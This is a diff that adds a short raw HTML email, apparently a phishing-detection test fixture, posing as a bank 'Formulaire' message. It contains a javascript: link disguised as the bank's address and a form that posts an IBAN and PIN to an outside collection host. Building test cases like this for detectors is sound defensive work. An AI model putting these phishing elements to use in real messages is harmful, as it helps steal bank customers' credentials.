@@ -1,0 +1,10 @@
+From: Banque <info@bank.example.com>
+To: client@example.org
+Subject: Formulaire
+Content-Type: text/html; charset="utf-8"
+
+<a href="javascript:alert(1)">www.bank.example.com</a>
+<form action="https://collect.example.net/p" method="post">
+<input name="iban"><input type="password" name="pin"></form>
+<a href="mailto:aide@bank.example.com">aide@bank.example.com</a>
+<a href="/relatif">www.bank.example.com</a>
